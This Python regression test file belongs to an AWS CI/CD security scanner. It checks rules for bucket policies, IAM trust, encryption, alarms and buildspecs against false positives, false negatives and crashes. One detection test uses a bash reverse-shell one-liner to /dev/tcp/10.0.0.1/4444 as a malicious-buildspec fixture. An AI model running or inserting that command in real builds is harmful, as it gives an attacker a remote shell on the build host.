"""Regression tests from the rule audit (FP/FN/crash fixes).

Each test pins a specific defect the audit found: a check that crashed
on valid-but-unusual input, or that produced a false positive / false
negative. Grouped here rather than scattered so the audit's coverage is
auditable in one place.
"""
from __future__ import annotations

import json
from unittest.mock import MagicMock

from botocore.exceptions import ClientError

from pipeline_check.core.checks.aws.rules import ca001_domain_encryption as ca001
from pipeline_check.core.checks.aws.rules import cb008_inline_buildspec as cb008
from pipeline_check.core.checks.aws.rules import cb011_malicious_buildspec as cb011
from pipeline_check.core.checks.aws.rules import ccm003_trigger_cross_account as ccm003
from pipeline_check.core.checks.aws.rules import cd003_alarm_config as cd003
from pipeline_check.core.checks.aws.rules import cp002_artifact_encryption as cp002
from pipeline_check.core.checks.aws.rules import cp005_production_approval as cp005
from pipeline_check.core.checks.aws.rules import cw001_failed_build_alarm as cw001
from pipeline_check.core.checks.aws.rules import eb001_pipeline_failure_rule as eb001
from pipeline_check.core.checks.aws.rules import ecr003_public_policy as ecr003
from pipeline_check.core.checks.aws.rules import iam001_admin_access as iam001
from pipeline_check.core.checks.aws.rules import iam005_external_trust as iam005
from pipeline_check.core.checks.aws.rules import lmb004_resource_policy_public as lmb004
from pipeline_check.core.checks.aws.rules import pbac002_shared_service_role as pbac002
from pipeline_check.core.checks.aws.rules import pbac005_stage_role_reuse as pbac005
from pipeline_check.core.checks.aws.rules import s3005_secure_transport as s3005
from pipeline_check.core.checks.aws.rules import sm001_rotation as sm001


def _catalog(**attrs):
    cat = MagicMock()
    for name, value in attrs.items():
        getattr(cat, name).return_value = value
    return cat


class TestS3005SecureTransport:
    def test_single_dict_statement_does_not_crash(self):
        # A legal S3 bucket policy may carry Statement as a single object,
        # not a list. Iterating it used to walk the dict's string keys.
        doc = {"Version": "2012-10-17", "Statement": {
            "Effect": "Deny", "Principal": "*", "Action": "s3:*",
            "Resource": "arn:aws:s3:::b/*",
            "Condition": {"Bool": {"aws:SecureTransport": "false"}}}}
        assert s3005._policy_denies_insecure_transport(doc) is True

    def test_list_form_condition_value_detected(self):
        # Bool condition value may be a single-element list ["false"].
        doc = {"Statement": [{"Effect": "Deny", "Condition": {
            "Bool": {"aws:SecureTransport": ["false"]}}}]}
        assert s3005._policy_denies_insecure_transport(doc) is True


class TestECR003PublicPolicy:
    def _check(self, policy):
        client = MagicMock()
        client.get_repository_policy.return_value = {"policyText": __import__("json").dumps(policy)}
        cat = _catalog(ecr_repositories=[{"repositoryName": "r"}])
        cat.client.return_value = client
        return ecr003.check(cat)[0]

    def test_bare_account_principal_does_not_crash_and_is_private(self):
        # A non-"*" string principal used to crash .get("AWS") on a str.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": "123456789012", "Action": "ecr:BatchGetImage"}]})
        assert f.passed is True

    def test_list_form_wildcard_is_public(self):
        # {"AWS": ["*"]} is a valid IAM representation of a public principal.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": {"AWS": ["*"]}, "Action": "x"}]})
        assert f.passed is False

    def test_org_scoped_wildcard_is_not_public(self):
        # The rule's own Safe example: wildcard principal narrowed by
        # aws:PrincipalOrgID is the org-sharing idiom, not public access.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": {"AWS": "*"}, "Action": "x",
            "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc"}}}]})
        assert f.passed is True


class TestPBAC002SharedServiceRole:
    def test_project_without_name_does_not_crash(self):
        cat = _catalog(codebuild_projects=[{"serviceRole": "arn:role/a"}])
        assert pbac002.check(cat)[0].passed is True


class TestCD003AlarmConfig:
    def test_alarm_without_name_does_not_crash(self):
        cat = _catalog(codedeploy_deployment_groups=[{
            "_ApplicationName": "a", "deploymentGroupName": "g",
            "alarmConfiguration": {"enabled": True, "alarms": [{"foo": "bar"}]}}])
        assert cd003.check(cat)[0].passed is True


class TestLMB004ResourcePolicyPublic:
    def test_non_dict_condition_does_not_crash(self):
        client = MagicMock()
        client.get_policy.return_value = {"Policy": (
            '{"Statement":[{"Effect":"Allow","Principal":"*",'
            '"Action":"lambda:InvokeFunction","Condition":"weird"}]}')}
        cat = _catalog(lambda_functions=[{"FunctionName": "f"}])
        cat.client.return_value = client
        res = lmb004.check(cat)
        assert res and res[0].passed is False


class TestCP005ProductionApproval:
    def test_substring_names_are_not_production(self):
        # "live"/"prod" were matched as substrings, so "Delivery",
        # "Deliver", and "Product" were misread as production stages.
        for name in ("Delivery", "Deliver", "Product"):
            assert cp005._name_matches_prod(name) is False

    def test_real_production_names_match(self):
        # Whole-word matching across camelCase / kebab / snake.
        for name in ("Production", "ProdDeploy", "deploy-prod", "go-live"):
            assert cp005._name_matches_prod(name) is True


class TestIAM005ExternalTrust:
    def _check(self, principal_arn, role_account="123456789012"):
        role = {
            "RoleName": "r", "Arn": f"arn:aws:iam::{role_account}:role/r",
            "AssumeRolePolicyDocument": {"Statement": [{"Effect": "Allow",
                "Principal": {"AWS": principal_arn},
                "Action": "sts:AssumeRole"}]}}
        return iam005.check(_catalog(cicd_roles=[role]))[0]

    def test_same_account_principal_not_flagged(self):
        # A same-account root principal is not a confused-deputy vector,
        # so a missing sts:ExternalId should not be flagged.
        assert self._check("arn:aws:iam::123456789012:root").passed is True

    def test_external_principal_still_flagged(self):
        assert self._check("arn:aws:iam::999999999999:root").passed is False


class TestSM001Rotation:
    def _check(self, ref_value, secrets):
        cat = _catalog(
            codebuild_projects=[{"name": "p", "environment": {
                "environmentVariables": [
                    {"type": "SECRETS_MANAGER", "value": ref_value}]}}],
            secrets=secrets)
        return sm001.check(cat)

    def test_arn_ref_matches_only_that_secret(self):
        # `split(":")[0]` reduced an ARN ref to the literal "arn", which
        # is a substring of every secret ARN, so every secret was flagged.
        arn = "arn:aws:secretsmanager:us-east-1:123:secret:prod/db-master-AbCdEf"
        res = self._check(arn, [
            {"Name": "prod/db-master", "ARN": arn, "RotationEnabled": False},
            {"Name": "other", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:other-AAAAAA",
             "RotationEnabled": False}])
        assert len(res) == 1 and res[0].resource == "prod/db-master"

    def test_bare_name_does_not_match_sibling_prefix(self):
        # A bare-name ref "my-secret" used to match "my-secret-staging"
        # via the `ref in arn` substring branch.
        res = self._check("my-secret", [
            {"Name": "my-secret", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-XXXXXX",
             "RotationEnabled": True},
            {"Name": "my-secret-staging",
             "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-staging-YYYYYY",
             "RotationEnabled": False}])
        assert len(res) == 1 and res[0].resource == "my-secret" and res[0].passed is True


class TestCB008InlineBuildspec:
    def test_single_line_json_is_inline(self):
        # The shape the CodeBuild API/console emits for an inline JSON
        # buildspec; it has no newline and starts with '{'.
        spec = json.dumps({"phases": {"build": {"commands": ["x"]}}})
        assert cb008._is_inline(spec) is True

    def test_repo_path_is_not_inline(self):
        assert cb008._is_inline("ci/buildspec.yml") is False


class TestCB011MaliciousBuildspec:
    def test_single_line_json_reverse_shell_fires(self):
        spec = json.dumps({"phases": {"build": {"commands": [
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}}})
        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": spec}}])
        res = cb011.check(cat)
        assert res and res[0].passed is False

    def test_repo_path_buildspec_not_scanned(self):
        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": "ci/build.yml"}}])
        assert cb011.check(cat) == []


# ---------------------------------------------------------------------------
# Batch 5 false-negative fixes
# ---------------------------------------------------------------------------


class TestCA001DomainEncryption:
    """CA-001: detect AWS-managed default encryption (empty encryptionKey)."""

    def test_no_key_fires(self):
        # Domain with no encryptionKey configured should be flagged.
        cat = _catalog(codeartifact_domains=[{"name": "d"}])
        res = ca001.check(cat)
        assert res and res[0].passed is False

    def test_empty_string_key_fires(self):
        # An explicitly empty string is the same as absent.
        cat = _catalog(codeartifact_domains=[{"name": "d", "encryptionKey": ""}])
        res = ca001.check(cat)
        assert res and res[0].passed is False

    def test_resolved_arn_key_passes(self):
        # When an encryptionKey ARN is present, assume a CMK is configured.
        # (The previous alias/aws/ substring check would falsely pass this.)
        cat = _catalog(codeartifact_domains=[{
            "name": "d",
            "encryptionKey": "arn:aws:kms:us-east-1:123456789012:key/mrk-abc123def456",
        }])
        res = ca001.check(cat)
        assert res and res[0].passed is True

    def test_alias_key_passes(self):
        # A domain explicitly configured with any key alias should pass.
        cat = _catalog(codeartifact_domains=[{
            "name": "d",
            "encryptionKey": "alias/my-cmk",
        }])
        res = ca001.check(cat)
        assert res and res[0].passed is True


class TestCCM003TriggerCrossAccount:
    """CCM-003: cross-account trigger detection, partition coverage, STS fallback."""

    def _make_cat(self, dest_arn, self_account="111111111111", repo_arn=""):
        cat = MagicMock()
        sts_client = MagicMock()
        sts_client.get_caller_identity.return_value = {"Account": self_account}
        cc_client = MagicMock()
        cc_client.get_repository_triggers.return_value = {
            "triggers": [{"destinationArn": dest_arn}]
        }
        repo = {"repositoryName": "my-repo"}
        if repo_arn:
            repo["repositoryArn"] = repo_arn

        def _client(svc):
            if svc == "sts":
                return sts_client
            return cc_client

        cat.client.side_effect = _client
        cat.codecommit_repositories.return_value = [repo]
        return cat

    def test_aws_cn_cross_account_fires(self):
        # China-partition ARN with a different account ID must be flagged.
        cat = self._make_cat(
            dest_arn="arn:aws-cn:sns:cn-north-1:999999999999:my-topic",
            self_account="111111111111",
        )
        res = ccm003.check(cat)
        assert res and res[0].passed is False

    def test_aws_cn_same_account_passes(self):
        # Same account in China partition should pass.
        cat = self._make_cat(
            dest_arn="arn:aws-cn:sns:cn-north-1:111111111111:my-topic",
            self_account="111111111111",
        )
        res = ccm003.check(cat)
        assert res and res[0].passed is True

    def test_govcloud_cross_account_fires(self):
        # GovCloud-partition ARN with a different account ID must be flagged.
        cat = self._make_cat(
            dest_arn="arn:aws-us-gov:lambda:us-gov-west-1:999999999999:function:fn",
            self_account="111111111111",
        )
        res = ccm003.check(cat)
        assert res and res[0].passed is False

    def test_commercial_cross_account_still_fires(self):
        # Existing commercial-partition detection must still work.
        cat = self._make_cat(
            dest_arn="arn:aws:sns:us-east-1:999999999999:topic",
            self_account="111111111111",
        )
        res = ccm003.check(cat)
        assert res and res[0].passed is False

    def test_sts_failure_cross_account_does_not_pass(self):
        # When STS raises, a cross-account trigger must NOT silently pass.
        cat = MagicMock()
        sts_client = MagicMock()
        sts_client.get_caller_identity.side_effect = ClientError(
            {"Error": {"Code": "AccessDenied", "Message": "x"}}, "GetCallerIdentity"
        )
        cc_client = MagicMock()
        cc_client.get_repository_triggers.return_value = {
            "triggers": [{"destinationArn": "arn:aws:sns:us-east-1:999999999999:topic"}]
        }

        def _client(svc):
            if svc == "sts":
                return sts_client
            return cc_client

        cat.client.side_effect = _client
        # Repo ARN provides account fallback (111...) — different from dest 999...
        cat.codecommit_repositories.return_value = [{
            "repositoryName": "r",
            "repositoryArn": "arn:aws:codecommit:us-east-1:111111111111:r",
        }]
        res = ccm003.check(cat)
        assert res and res[0].passed is False

    def test_sts_failure_no_repo_arn_is_degraded_not_silent(self):
        # With no repo ARN and STS down, the trigger still surfaces as failed.
        cat = MagicMock()
        sts_client = MagicMock()
        sts_client.get_caller_identity.side_effect = Exception("network error")
        cc_client = MagicMock()
        cc_client.get_repository_triggers.return_value = {
            "triggers": [{"destinationArn": "arn:aws:sns:us-east-1:999999999999:topic"}]
        }

        def _client(svc):
            if svc == "sts":
                return sts_client
            return cc_client

        cat.client.side_effect = _client
        cat.codecommit_repositories.return_value = [{"repositoryName": "r"}]
        res = ccm003.check(cat)
        assert res and res[0].passed is False


class TestIAM001AdminAccess:
    """IAM-001: AdministratorAccess detection across all AWS partitions."""

    def _check(self, arns):
        role = {"RoleName": "r"}
        cat = MagicMock()
        cat.cicd_roles.return_value = [role]
        cat.iam_role_attached_arns.return_value = (arns, None)
        return iam001.check(cat)[0]

    def test_commercial_admin_fires(self):
        f = self._check(["arn:aws:iam::aws:policy/AdministratorAccess"])
        assert f.passed is False

    def test_govcloud_admin_fires(self):
        # GovCloud uses arn:aws-us-gov: partition.
        f = self._check(["arn:aws-us-gov:iam::aws:policy/AdministratorAccess"])
        assert f.passed is False

    def test_china_admin_fires(self):
        # China uses arn:aws-cn: partition.
        f = self._check(["arn:aws-cn:iam::aws:policy/AdministratorAccess"])
        assert f.passed is False

    def test_non_admin_policy_passes(self):
        f = self._check(["arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess"])
        assert f.passed is True

    def test_no_policies_passes(self):
        f = self._check([])
        assert f.passed is True


class TestPBAC005StageRoleReuse:
    """PBAC-005: every action must have its own scoped role."""

    _PIPELINE_ROLE = "arn:aws:iam::123:role/pipeline-master"

    def _check(self, stages):
        cat = _catalog(codepipeline_pipelines=[{
            "name": "p",
            "roleArn": self._PIPELINE_ROLE,
            "stages": stages,
        }])
        return pbac005.check(cat)[0]

    def test_all_actions_scoped_passes(self):
        f = self._check([
            {"name": "Source", "actions": [{"roleArn": "arn:aws:iam::123:role/src"}]},
            {"name": "Build",  "actions": [{"roleArn": "arn:aws:iam::123:role/bld"}]},
            {"name": "Deploy", "actions": [{"roleArn": "arn:aws:iam::123:role/dep"}]},
        ])
        assert f.passed is True

    def test_no_action_scoped_fires(self):
        f = self._check([
            {"name": "Source", "actions": [{"roleArn": self._PIPELINE_ROLE}]},
            {"name": "Build",  "actions": [{"roleArn": self._PIPELINE_ROLE}]},
        ])
        assert f.passed is False

    def test_partial_override_fires(self):
        # One scoped action does not protect the rest; the build action still
        # mirrors the pipeline role, so the pipeline must be flagged.
        f = self._check([
            {"name": "Source", "actions": [{"roleArn": "arn:aws:iam::123:role/src"}]},
            {"name": "Build",  "actions": [{"roleArn": self._PIPELINE_ROLE}]},
            {"name": "Deploy", "actions": [{"roleArn": self._PIPELINE_ROLE}]},
        ])
        assert f.passed is False

    def test_one_action_total_scoped_passes(self):
        f = self._check([
            {"name": "Source", "actions": [{"roleArn": "arn:aws:iam::123:role/src"}]},
        ])
        assert f.passed is True

    def test_approval_action_excluded_from_count(self):
        # A Manual Approval action has no execution role; it must not inflate
        # the denominator and cause a false positive on an otherwise-scoped pipeline.
        f = self._check([
            {"name": "Source", "actions": [
                {"roleArn": "arn:aws:iam::123:role/src",
                 "actionTypeId": {"category": "Source", "owner": "AWS", "provider": "CodeCommit", "version": "1"}},
            ]},
            {"name": "Build", "actions": [
                {"roleArn": "arn:aws:iam::123:role/bld",
                 "actionTypeId": {"category": "Build", "owner": "AWS", "provider": "CodeBuild", "version": "1"}},
            ]},
            {"name": "Approve", "actions": [
                # No roleArn — this is a Manual approval gate, not an executor.
                {"name": "Approve",
                 "actionTypeId": {"category": "Approval", "owner": "AWS", "provider": "Manual", "version": "1"}},
            ]},
            {"name": "Deploy", "actions": [
                {"roleArn": "arn:aws:iam::123:role/dep",
                 "actionTypeId": {"category": "Deploy", "owner": "AWS", "provider": "CodeDeploy", "version": "1"}},
            ]},
        ])
        assert f.passed is True


class TestCP002ArtifactEncryption:
    """CP-002: artifact store with AWS-managed key must fire."""

    def test_no_encryption_key_fires(self):
        cat = _catalog(codepipeline_pipelines=[{
            "name": "p",
            "artifactStore": {"location": "my-bucket", "type": "S3"},
        }])
        res = cp002.check(cat)
        assert res and res[0].passed is False

    def test_aws_managed_alias_fires(self):
        # alias/aws/s3 is AWS-managed, not a customer CMK.
        cat = _catalog(codepipeline_pipelines=[{
            "name": "p",
            "artifactStore": {
                "location": "my-bucket",
                "type": "S3",
                "encryptionKey": {"id": "alias/aws/s3", "type": "KMS"},
            },
        }])
        res = cp002.check(cat)
        assert res and res[0].passed is False

    def test_customer_cmk_arn_passes(self):
        cat = _catalog(codepipeline_pipelines=[{
            "name": "p",
            "artifactStore": {
                "location": "my-bucket",
                "type": "S3",
                "encryptionKey": {
                    "id": "arn:aws:kms:us-east-1:123456789012:key/mrk-abc",
                    "type": "KMS",
                },
            },
        }])
        res = cp002.check(cat)
        assert res and res[0].passed is True

    def test_customer_cmk_alias_passes(self):
        cat = _catalog(codepipeline_pipelines=[{
            "name": "p",
            "artifactStore": {
                "location": "my-bucket",
                "type": "S3",
                "encryptionKey": {"id": "alias/my-pipeline-key", "type": "KMS"},
            },
        }])
        res = cp002.check(cat)
        assert res and res[0].passed is True


class TestCW001FailedBuildAlarm:
    """CW-001: metric-math alarms covering FailedBuilds must pass the check."""

    def _make_cat(self, alarms):
        client = MagicMock()
        client.describe_alarms.return_value = {"MetricAlarms": alarms}
        cat = MagicMock()
        cat.client.return_value = client
        cat.codebuild_projects.return_value = [{"name": "p"}]
        return cat

    def test_standard_alarm_passes(self):
        cat = self._make_cat([{
            "AlarmName": "cb-failures",
            "Namespace": "AWS/CodeBuild",
            "MetricName": "FailedBuilds",
        }])
        res = cw001.check(cat)
        assert res and res[0].passed is True

    def test_metric_math_alarm_passes(self):
        # Metric-math alarms lack top-level Namespace/MetricName.
        cat = self._make_cat([{
            "AlarmName": "cb-failures-math",
            "Metrics": [{
                "MetricStat": {
                    "Metric": {
                        "Namespace": "AWS/CodeBuild",
                        "MetricName": "FailedBuilds",
                    }
                }
            }],
        }])
        res = cw001.check(cat)
        assert res and res[0].passed is True

    def test_no_alarm_fires(self):
        cat = self._make_cat([])
        res = cw001.check(cat)
        assert res and res[0].passed is False

    def test_unrelated_alarm_fires(self):
        cat = self._make_cat([{
            "AlarmName": "other",
            "Namespace": "AWS/CodeBuild",
            "MetricName": "SucceededBuilds",
        }])
        res = cw001.check(cat)
        assert res and res[0].passed is False


class TestEB001PipelineFailureRule:
    """EB-001: EventBridge rules — no-state-filter covers FAILED."""

    def _check(self, pattern):
        cat = _catalog(eventbridge_rules=[{"EventPattern": json.dumps(pattern)}])
        return eb001.check(cat)[0]

    def test_explicit_failed_state_passes(self):
        f = self._check({
            "detail-type": ["CodePipeline Pipeline Execution State Change"],
            "detail": {"state": ["FAILED"]},
        })
        assert f.passed is True

    def test_no_state_filter_passes(self):
        # No detail.state means all states, including FAILED.
        f = self._check({
            "detail-type": ["CodePipeline Pipeline Execution State Change"],
        })
        assert f.passed is True

    def test_only_succeeded_filter_fires(self):
        # A rule filtering only SUCCEEDED does NOT cover FAILED.
        f = self._check({
            "detail-type": ["CodePipeline Pipeline Execution State Change"],
            "detail": {"state": ["SUCCEEDED"]},
        })
        assert f.passed is False

    def test_no_pipeline_rule_fires(self):
        cat = _catalog(eventbridge_rules=[])
        assert eb001.check(cat)[0].passed is False
